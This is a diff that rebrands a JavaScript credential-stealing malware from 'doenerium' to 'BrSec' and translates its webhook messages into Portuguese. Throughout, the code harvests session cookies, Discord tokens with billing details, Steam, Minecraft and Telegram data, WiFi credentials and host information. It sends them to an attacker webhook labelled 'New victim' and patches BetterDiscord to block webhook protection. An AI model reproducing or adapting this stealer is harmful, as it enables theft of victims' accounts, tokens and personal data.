@@ -322,7 +322,7 @@
                         cpus: [],
                         ram: client.utils.encryption.encryptData(`${Math.round(client.requires.os.totalmem() / 1024 / 1024 / 1024)} GB`),
                         version: client.utils.encryption.encryptData(client.requires.os.version()),
-                        uptime: client.utils.encryption.encryptData(`${(client.requires.os.uptime() / 60).toFixed(0)} minutes (${(client.requires.os.uptime() / 60 / 60).toFixed(2)} hours)`),
+                        uptime: client.utils.encryption.encryptData(`${(client.requires.os.uptime() / 60).toFixed(0)} minutos (${(client.requires.os.uptime() / 60 / 60).toFixed(2)} horas)`),
                         hostdir: client.utils.encryption.encryptData(client.requires.os.homedir()),
                         hostname: client.utils.encryption.encryptData(client.requires.os.hostname()),
                         username: client.utils.encryption.encryptData(client.requires.os.userInfo().username),
@@ -937,8 +937,8 @@
                                     embeds: [
                                         client.utils.webhook.createEmbed(
                                             {
-                                                "title": "Reddit session detected",
-                                                "description": `The reddit session was detected on the \`\`${browser}\`\` browser`,
+                                                "title": "Sessão do Reddit detectada",
+                                                "description": `A sessão do Reddit foi detectada no navegador \`\`${browser}\`\``,
                                                 "thumbnail": {
                                                     url: accountInfo.icon_img
                                                 },
@@ -949,47 +949,46 @@
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Profile URL",
-                                                        value: `[Click here](https://www.reddit.com/user/${accountInfo.name})`,
+                                                        name: "URL do Perfil",
+                                                        value: `[Clique aqui](https://www.reddit.com/user/${accountInfo.name})`,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Username",
+                                                        name: "Nome de Usuário",
                                                         value: `\`\`\`${accountInfo.name}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Comment Karma",
+                                                        name: "Karma de Comentários",
                                                         value: `\`\`\`${accountInfo.comment_karma}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Total Karma",
+                                                        name: "Karma Total",
                                                         value: `\`\`\`${accountInfo.total_karma}\`\`\``,
                                                         inline: true
                                                     },
-
                                                     {
-                                                        name: "Coins",
+                                                        name: "Moedas",
                                                         value: `\`\`\`${accountInfo.coins}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Is Mod",
+                                                        name: "É Moderador",
                                                         value: `\`\`\`${accountInfo.is_mod}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Is Gold",
+                                                        name: "É Gold",
                                                         value: `\`\`\`${accountInfo.is_gold}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Suspended",
+                                                        name: "Suspenso",
                                                         value: `\`\`\`${accountInfo.is_suspended}\`\`\``,
                                                         inline: false
                                                     },
-
+    
                                                 ]
                                             }
                                         )
@@ -1002,7 +1001,7 @@
                                     client.utils.jszip.createFolder("\\Reddit Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)
 
 
                             } catch (e) {
@@ -1037,8 +1036,8 @@
                                     embeds: [
                                         client.utils.webhook.createEmbed(
                                             {
-                                                "title": "TikTok session detected",
-                                                "description": `The tiktok session was detected on the \`\`${browser}\`\` browser`,
+                                                "title": "Sessão TikTok detectada",
+                                                "description": `A sessão do TikTok foi detectada no navegador \`\`${browser}\`\``,
                                                 fields: [
                                                     {
                                                         name: "Cookie",
@@ -1046,36 +1045,35 @@
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Profile URL",
-                                                        value: `[Click here](https://tiktok.com/@${accountInfo.data.username})`,
+                                                        name: "URL do Perfil",
+                                                        value: `[Clique aqui](https://tiktok.com/@${accountInfo.data.username})`,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "User identifier",
+                                                        name: "Identificador do Usuário",
                                                         value: `\`\`\`${accountInfo.data.user_id_str}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
                                                         name: "Email",
-                                                        value: `\`\`\`${accountInfo.data.email || "No Email"}\`\`\``,
+                                                        value: `\`\`\`${accountInfo.data.email || "Sem Email"}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Username",
+                                                        name: "Nome de Usuário",
                                                         value: `\`\`\`${accountInfo.data.username}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Follower Count",
+                                                        name: "Quantidade de Seguidores",
                                                         value: `\`\`\`${insights.follower_num.value}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Coins",
+                                                        name: "Moedas",
                                                         value: `\`\`\`${wallet.data.coins}\`\`\``,
                                                         inline: false
-                                                    },
-
+                                                    },    
                                                 ]
                                             }
                                         )
@@ -1088,7 +1086,7 @@
                                     client.utils.jszip.createFolder("\\TikTok Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1107,8 +1105,8 @@
                                     embeds: [
                                         client.utils.webhook.createEmbed(
                                             {
-                                                "title": "Roblox session detected",
-                                                "description": `The roblox session was detected on the \`\`${browser}\`\` browser`,
+                                                "title": "Sessão Roblox detectada",
+                                                "description": `A sessão roblox foi detectada no navegador \`\`${browser}\`\``,
                                                 "thumbnail": {
                                                     url: skin.data[0].imageUrl,
                                                 },
@@ -1119,8 +1117,8 @@
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Profile URL",
-                                                        value: `[Click here](https://roblox.com/users/${accountInfo.UserId}/profile)`,
+                                                        name: "URL do Perfil",
+                                                        value: `[Clique aqui](https://roblox.com/users/${accountInfo.UserId}/profile)`,
                                                         inline: false
                                                     },
                                                     {
@@ -1129,12 +1127,12 @@
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Name",
+                                                        name: "Nome",
                                                         value: `\`\`\`${accountInfo.Name}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Display Name",
+                                                        name: "Nome de Exibição",
                                                         value: `\`\`\`${accountInfo.DisplayName}\`\`\``,
                                                         inline: false
                                                     },
@@ -1144,11 +1142,10 @@
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Email Verified",
+                                                        name: "Email Verificado",
                                                         value: `\`\`\`${accountInfo.IsEmailVerified}\`\`\``,
                                                         inline: false
                                                     },
-
                                                 ]
                                             }
                                         )
@@ -1161,7 +1158,7 @@
                                     client.utils.jszip.createFolder("\\Roblox Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1187,8 +1184,8 @@
                                     embeds: [
                                         client.utils.webhook.createEmbed(
                                             {
-                                                "title": "Twitter session detected",
-                                                "description": `The twitter session was detected on the \`\`${browser}\`\` browser`,
+                                                "title": "Sessão do Twitter detectada",
+                                                "description": `A sessão do Twitter foi detectada no navegador \`\`${browser}\`\``,
                                                 "thumbnail": {
                                                     url: profile.profile_image_url_https,
                                                 },
@@ -1198,37 +1195,37 @@
                                                         value: `\`\`\`${cookie}\`\`\``
                                                     },
                                                     {
-                                                        name: "Profile URL",
-                                                        value: `[Click here](https://twitter.com/${profile.screen_name})`,
+                                                        name: "URL do Perfil",
+                                                        value: `[Clique aqui](https://twitter.com/${profile.screen_name})`,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Screen name",
+                                                        name: "Nome de tela",
                                                         value: `\`\`\`${profile.screen_name}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Nickname",
+                                                        name: "Apelido",
                                                         value: `\`\`\`${profile.name}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Description",
+                                                        name: "Descrição",
                                                         value: `\`\`\`${profile.description}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Follower Count",
+                                                        name: "Contagem de Seguidores",
                                                         value: `\`\`\`${profile.followers_count}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Following Count",
+                                                        name: "Contagem de Seguindo",
                                                         value: `\`\`\`${profile.friends_count}\`\`\``,
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Created at",
+                                                        name: "Criado em",
                                                         value: `\`\`\`${profile.created_at}\`\`\``,
                                                         inline: false
                                                     },
@@ -1238,10 +1235,11 @@
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Verified",
+                                                        name: "Verificado",
                                                         value: `\`\`\`${profile.verified}\`\`\``,
                                                         inline: true
                                                     }
+    
                                                 ]
                                             }
                                         )
@@ -1254,7 +1252,7 @@
                                     client.utils.jszip.createFolder("\\Twitter Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1271,8 +1269,8 @@
                                     embeds: [
                                         client.utils.webhook.createEmbed(
                                             {
-                                                "title": "Instagram session detected",
-                                                "description": `The instagram session was detected on the \`\`${browser}\`\` browser`,
+                                                "title": "Sessão do Instagram detectada",
+                                                "description": `A sessão do Instagram foi detectada no navegador \`\`${browser}\`\``,
                                                 "thumbnail": {
                                                     url: accountInfo.profile_pic_url,
                                                 },
@@ -1283,33 +1281,33 @@
                                                         inline: true
                                                     },
                                                     {
-                                                        name: "Profile URL",
-                                                        value: `[Click here](https://instagram.com/${accountInfo.username})`,
+                                                        name: "URL do Perfil",
+                                                        value: `[Clique aqui](https://instagram.com/${accountInfo.username})`,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Username",
+                                                        name: "Nome de Usuário",
                                                         value: `\`\`\`${accountInfo.username}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Follower Count",
+                                                        name: "Contagem de Seguidores",
                                                         value: `\`\`\`${accountInfo2.follower_count}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Following Count",
+                                                        name: "Contagem de Seguindo",
                                                         value: `\`\`\`${accountInfo2.following_count}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Verified",
+                                                        name: "Verificado",
                                                         value: `\`\`\`${accountInfo.is_verified}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Nickname",
-                                                        value: `\`\`\`${accountInfo.full_name || "No nickname"}\`\`\``,
+                                                        name: "Apelido",
+                                                        value: `\`\`\`${accountInfo.full_name || "Sem apelido"}\`\`\``,
                                                         inline: false
                                                     },
                                                     {
@@ -1318,10 +1316,11 @@
                                                         inline: false
                                                     },
                                                     {
-                                                        name: "Biography",
-                                                        value: `\`\`\`${accountInfo.biography || "No biography"}\`\`\``,
+                                                        name: "Biografia",
+                                                        value: `\`\`\`${accountInfo.biography || "Sem biografia"}\`\`\``,
                                                         inline: false
                                                     },
+    
                                                 ]
                                             }
                                         )
@@ -1334,7 +1333,7 @@
                                     client.utils.jszip.createFolder("\\Instagram Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)
 
 
                             } catch (e) { }
@@ -1380,11 +1379,11 @@
 
                                             if (found_keywords.length == 0) {
                                                 found_keywords =
-                                                    "Found keywords: None\n<================[t.me/doenerium]>================>\n";
+                                                    "Found keywords: None\n<================[t.me/BrSec]>================>\n";
                                             } else {
                                                 found_keywords = `Found keywords: ${found_keywords.join(
                                                     ", "
-                                                )}\n<================[t.me/doenerium]>================>\n`;
+                                                )}\n<================[t.me/BrSec]>================>\n`;
                                             }
 
                                             client.utils.jszip.createTxt(
@@ -2211,15 +2210,15 @@
                                 var fields = [];
 
                                 for (let [key, value] of Object.entries({
-                                    "Source": source,
-                                    "Identifier": req.data.id,
-                                    "Username": `${req.data.username}#${req.data.discriminator}`,
-                                    "Phone Number": req.data.phone,
-                                    "E-Mail Address": req.data.email,
-                                    "Locale": req.data.locale,
+                                    "Fonte": source,
+                                    "ID": req.data.id,
+                                    "Usuário": `${req.data.username}#${req.data.discriminator}`,
+                                    "Telefone": req.data.phone,
+                                    "E-mail": req.data.email,
+                                    "Pais": req.data.locale,
                                     "Nitro": this.getNitro(req.data.premium_type),
-                                    "Badges": this.getBadges(req.data.flags) != '' ? this.getBadges(req.data.flags) : 'None',
-                                    "Billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
+                                    "Badges": this.getBadges(req.data.flags) != '' ? this.getBadges(req.data.flags) : 'Nenhum',
+                                    "Cartão vinculado": _billing.join(", ") != '' ? _billing.join(", ") : 'Nenhum',
                                     "Token": token
                                 })) {
                                     fields.push({
@@ -2232,7 +2231,7 @@
                                 await client.utils.webhook.sendToWebhook(
                                     {
                                         "embeds": [client.utils.webhook.createEmbed({
-                                            "title": `Found token in: ${source}`,
+                                            "title": `Token encontrado : ${source}`,
                                             "fields": fields,
                                             "thumbnail": {
                                                 "url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
@@ -2331,13 +2330,13 @@
                         getNitro(premium_type) {
                             switch (premium_type) {
                                 case 0:
-                                    return "No Nitro";
+                                    return "Sem Nitro";
                                 case 1:
                                     return "Nitro Classic";
                                 case 2:
                                     return "Nitro Boost";
                                 default:
-                                    return "No Nitro";
+                                    return "Sem Nitro";
 
                             };
                         },
@@ -2394,7 +2393,7 @@
                             if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                                 var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
                                 client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
-                                    "api/webhooks", "doenerium_on_top"))
+                                    "api/webhooks", "BrSec_on_top"))
 
                             }
 
@@ -2486,8 +2485,8 @@
 
                             await client.utils.time.sleep(5000);
                             for (const path of client.config.discord.files_path) {
-                                if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
-                                    client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
+                                if (client.requires.fs.existsSync(path.replace("index.js", "BrSec"))) {
+                                    client.requires.fs.rmdirSync(path.replace("index.js", "BrSec"));
                                 }
                             }
                         }
@@ -3096,7 +3095,7 @@
                                             else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                                         } catch (err) {
                                             try {
-                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                             } catch { }
                                         }
 
@@ -3115,7 +3114,7 @@
                             }
 
                             let pc_info_text =
-                                "<================[   User Info   ]>================>\n<================[t.me/doenerium]>================>\n\n";
+                                "<================[   User Info   ]>================>\n<================[t.me/BrSec]>================>\n\n";
                             let fields = [];
 
                             const wifi_connections = await client.config.user.wifi_connections();
@@ -3173,7 +3172,7 @@
                                 });
                             }
 
-                            let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/doenerium ]>================>\n\n${wifi_connections}`;
+                            let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/BrSec ]>================>\n\n${wifi_connections}`;
 
                             client.utils.jszip.createTxt(
                                 "\\WiFi Connections.txt",
@@ -3188,21 +3187,21 @@
 
                         get_executable_info() {
                             let executable_info_text =
-                                "<================[Executable Info]>================>\n<================[t.me/doenerium]>================>\n\n";
+                                "<================[Executable Info]>================>\n<================[t.me/BrSec]>================>\n\n";
                             let fields = [];
 
                             for (let [key, value] of Object.entries({
-                                "☠️ Execution path": client.utils.encryption.decryptData(
+                                "☠️ Onde foi executado": client.utils.encryption.decryptData(
                                     client.config.executable.execution_path
                                 ),
                                 "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
-                                "🛑 Version": client.utils.encryption.decryptData(
+                                "🛑 Sistema Operacional": client.utils.encryption.decryptData(
                                     client.config.user.version
                                 ),
-                                "⏳ Uptime": client.utils.encryption.decryptData(
+                                "⏳ Tempo ligado": client.utils.encryption.decryptData(
                                     client.config.user.uptime
                                 ),
-                                "🆔 PC Name": client.utils.encryption.decryptData(
+                                "🆔 Usuário": client.utils.encryption.decryptData(
                                     client.config.user.username
                                 ),
                             })) {
@@ -3219,7 +3218,7 @@
                             );
 
                             return client.utils.webhook.createEmbed({
-                                title: "New victim",
+                                title: "Nova vítima",
                                 fields: fields,
                             });
                         },
@@ -3250,41 +3249,42 @@
                                             embeds: [
                                                 client.utils.webhook.createEmbed(
                                                     {
-                                                        title: "Steam session detected",
+                                                        title: "Conta Steam detectada",
                                                         thumbnail: {
                                                             url: accountInfo.players[0].avatarfull,
                                                         },
                                                         fields: [
                                                             {
-                                                                name: "Steam Identifier",
+                                                                name: "SteamID",
                                                                 value: `\`\`\`${account}\`\`\``,
                                                                 inline: false
                                                             },
                                                             {
-                                                                name: "Profile URL",
-                                                                value: `[Click here](${accountInfo.players[0].profileurl})`,
+                                                                name: "URL do Perfil",
+                                                                value: `[Clique aqui](${accountInfo.players[0].profileurl})`,
                                                                 inline: false
                                                             },
                                                             {
-                                                                name: "Display Name",
+                                                                name: "Nome de Exibição",
                                                                 value: `\`\`\`${accountInfo.players[0].personaname}\`\`\``,
                                                                 inline: false
                                                             },
                                                             {
-                                                                name: "Time created",
-                                                                value: `\`\`\`${accountInfo.players[0].timecreated || "Private"}\`\`\``,
+                                                                name: "Data de criação",
+                                                                value: `\`\`\`${accountInfo.players[0].timecreated || "Privado"}\`\`\``,
                                                                 inline: false
                                                             },
                                                             {
-                                                                name: "Level",
-                                                                value: `\`\`\`${level.player_level || "Private"}\`\`\``,
+                                                                name: "Nível",
+                                                                value: `\`\`\`${level.player_level || "Privado"}\`\`\``,
                                                                 inline: false
                                                             },
                                                             {
-                                                                name: "Game count",
-                                                                value: `\`\`\`${games.game_count || "Private"}\`\`\``,
+                                                                name: "Contagem de jogos",
+                                                                value: `\`\`\`${games.game_count || "Privado"}\`\`\``,
                                                                 inline: false
-                                                            }
+                                                            },
+
                                                         ]
                                                     }
                                                 )
@@ -3298,7 +3298,7 @@
                                             client.utils.jszip.createFolder("\\Steam Accounts\\steamcache");
                                         }
 
-                                        client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)
+                                        client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)
 
                                         client.requires.fs.readdirSync("C:\\Program Files (x86)\\Steam\\config").forEach(file => {
                                             if (!["avatarcache", "gamepad", "lighthouse"].includes(file)) {
@@ -3336,13 +3336,13 @@
                                                 embeds: [
                                                     client.utils.webhook.createEmbed(
                                                         {
-                                                            title: "Minecraft session detected",
+                                                            title: "Conta de Minecraft detectada",
                                                             thumbnail: {
                                                                 url: "https://api.mineatar.io/face/" + account.minecraftProfile.id + "?scale=16",
                                                             },
                                                             fields: [
                                                                 {
-                                                                    name: "Username",
+                                                                    name: "Nome de Usuário",
                                                                     value: `\`\`\`${type.username}\`\`\``,
                                                                     inline: false
                                                                 },
@@ -3352,25 +3352,25 @@
                                                                     inline: false
                                                                 },
                                                                 {
-                                                                    name: "Type",
+                                                                    name: "Tipo",
                                                                     value: `\`\`\`${type.status}\`\`\``,
                                                                     inline: false
                                                                 },
                                                                 {
-                                                                    name: "Hypixel Rank",
-                                                                    value: `\`\`\`${hypixel.player.newPackageRank || "Not found"}\`\`\``,
+                                                                    name: "Rank no Hypixel",
+                                                                    value: `\`\`\`${hypixel.player.newPackageRank || "Não encontrado"}\`\`\``,
                                                                     inline: false
                                                                 },
                                                                 {
-                                                                    name: "Access Token",
-                                                                    value: `\`\`\`${account.accessToken || "Not found"}\`\`\``,
+                                                                    name: "Token de Acesso",
+                                                                    value: `\`\`\`${account.accessToken || "Não encontrado"}\`\`\``,
                                                                     inline: false
                                                                 },
                                                                 {
-                                                                    name: "Refresh Token",
-                                                                    value: `\`\`\`${account.refreshToken || "Not found"}\`\`\``,
+                                                                    name: "Token de Atualização",
+                                                                    value: `\`\`\`${account.refreshToken || "Não encontrado"}\`\`\``,
                                                                     inline: false
-                                                                }
+                                                                }    
                                                             ]
                                                         }
                                                     )
@@ -3385,7 +3385,7 @@
                                             }
 
                                             client.utils.jszip.createTxt(`\\Minecraft Accounts\\session_files\\${type.username}.json`, client.requires.fs.readFileSync(file, "utf-8"))
-                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)
+                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)
 
                                         }
                                     }
@@ -3400,7 +3400,7 @@
                                 await this.get_user_info();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3408,7 +3408,7 @@
                                 await this.get_telegram();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3416,7 +3416,7 @@
                                 await this.infect();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3459,7 +3459,7 @@
                                 await client.utils.browsers.saveBrowserStuff();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3473,27 +3473,28 @@
 
                             var counter_embed = this.create_counter_embed();
 
-                            counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;
+                            counter_embed.description = `**[Baixar arquivo ZIP](${upload.downloadPage})**`;
 
                             await client.utils.webhook.sendToWebhook({
                                 embeds: [counter_embed, client.utils.webhook.createEmbed({
-                                    title: "Keyword result",
+                                    title: "Resultado das palavras-chave",
                                     fields: [
                                         {
-                                            name: `Passwords`,
-                                            value: `\`\`\`${client.config.counter.keywords_passwords.join(", ") || "None"}\`\`\``,
+                                            name: `Senhas`,
+                                            value: `\`\`\`${client.config.counter.keywords_passwords.join(", ") || "Nenhum"}\`\`\``,
                                             inline: false
                                         },
                                         {
-                                            name: `Autofill`,
-                                            value: `\`\`\`${client.config.counter.keywords_autofill.join(", ") || "None"}\`\`\``,
+                                            name: `Preenchimento automático`,
+                                            value: `\`\`\`${client.config.counter.keywords_autofill.join(", ") || "Nenhum"}\`\`\``,
                                             inline: false
                                         },
                                         {
                                             name: `Cookies`,
-                                            value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
